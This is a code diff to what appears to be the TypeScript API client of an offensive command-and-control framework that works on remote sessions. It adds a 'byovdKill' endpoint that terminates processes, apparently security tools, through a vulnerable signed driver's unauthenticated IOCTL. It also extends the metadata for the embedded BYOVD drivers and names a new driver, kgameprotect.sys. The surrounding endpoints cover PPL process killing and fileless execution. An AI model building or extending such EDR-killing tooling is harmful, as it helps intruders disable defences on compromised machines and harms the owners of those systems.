@@ -110,6 +110,9 @@ export const sessionApi = {
     api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/byovd-load`, payload),
   byovdUnload: (id: string, serviceName?: string) =>
     api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/byovd-unload`, { service_name: serviceName }),
+  /** BYOVD 驱动击杀：按 PID 或进程名调用内置驱动的无鉴权终止 IOCTL */
+  byovdKill: (id: string, payload: { pid?: number; process_name?: string; driver?: string }) =>
+    api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/byovd-kill`, payload),
   pplKill: (id: string, processes?: string[]) =>
     api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/ppl-kill`, { processes }),
   filelessExec: (id: string, payload: {
@@ -145,13 +148,20 @@ export interface RelayNode {
 export interface BuiltinDriver {
   name: string
   description: string
+  /** 用途：kill = 无鉴权进程终止 */
+  purpose?: string
   device: string
   service: string
+  /** 终止进程的 IOCTL 码（METHOD_BUFFERED，入参首个 DWORD = PID） */
+  ioctl?: number
+  kill_pid_size?: number
   size: number
   sha256: string
+  /** 签名者（人工核对用） */
+  signed?: string
 }
 
-// 内置 BYOVD 利用驱动（RTCore64 / dbutil_2_3，原厂签名二进制，嵌在服务器二进制中）
+// 内置 BYOVD 利用驱动（当前内置 kgameprotect.sys，WHQL 签名二进制，嵌在服务端二进制中）
 export const driversApi = {
   list: () => api.get<{ drivers: BuiltinDriver[]; count: number }>('/drivers'),
   raw: async (name: string) => {
